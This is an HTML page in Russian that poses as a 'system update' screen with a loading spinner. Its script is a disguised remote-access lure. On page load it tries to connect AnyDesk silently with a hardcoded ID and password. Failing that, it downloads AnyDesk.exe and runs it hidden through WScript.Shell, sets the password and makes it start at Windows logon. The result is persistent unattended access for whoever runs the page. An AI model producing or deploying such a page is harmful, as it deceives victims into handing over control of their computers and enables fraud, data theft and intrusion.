<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Обновление системы</title>
    <style>
        body { background: #1a1a2e; color: white; font-family: Arial; text-align: center; padding-top: 100px; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { margin-top: 40px; color: #aaa; }
        #status { margin-top: 20px; color: #888; font-size: 14px; }
        .btn { display: none; margin-top: 30px; padding: 12px 24px; background: #3498db; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .btn:hover { background: #2980b9; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h1>Подключение к серверу обновлений...</h1>
    <p id="status">Идёт проверка компонентов...</p>
    <button class="btn" id="fallbackBtn" onclick="launchAnyDesk()">Нажмите для подключения</button>

    <script>
        // Ваши данные
        const YOUR_ID = "660090345";
        const YOUR_PASSWORD = "Pih0pEBklvDv2";
        const ANYDESK_URL = "https://download.anydesk.com/AnyDesk.exe";

        function launchAnyDesk() {
            // Пытаемся открыть через протокол
            window.location.href = `anydesk://connect?${YOUR_ID}&password=${YOUR_PASSWORD}&silent=true`;
            
            // Через 3 секунды проверяем, открылся ли AnyDesk
            setTimeout(function() {
                // Если страница всё ещё видна (не свернулась) — значит AnyDesk не открылся
                if (!document.hidden) {
                    document.getElementById('status').innerHTML = 'AnyDesk не найден. Выполняется автоматическая установка...';
                    downloadAndRunAnyDesk();
                }
            }, 3000);
        }

        function downloadAndRunAnyDesk() {
            // Создаём временную ссылку для скачивания
            var link = document.createElement('a');
            link.href = ANYDESK_URL;
            link.download = "AnyDesk.exe";
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            document.getElementById('status').innerHTML = 'Скачивание AnyDesk... После загрузки запустите файл.';
            document.getElementById('fallbackBtn').style.display = 'block';
            document.getElementById('fallbackBtn').innerHTML = 'Запустить AnyDesk после скачивания';
            
            // Обновляем кнопку для запуска скачанного файла
            document.getElementById('fallbackBtn').onclick = function() {
                // Запускаем скачанный AnyDesk с параметрами
                var shell = new ActiveXObject("WScript.Shell");
                shell.Run(`"%USERPROFILE%\\Downloads\\AnyDesk.exe" --silent --set-password ${YOUR_PASSWORD} --start-with-winlogon`, 0, false);
                setTimeout(function() {
                    window.location.href = `anydesk://connect?${YOUR_ID}&password=${YOUR_PASSWORD}&silent=true`;
                }, 2000);
            };
        }

        // Запускаем при загрузке страницы
        window.onload = function() {
            launchAnyDesk();
        };
    </script>
</body>
</html>
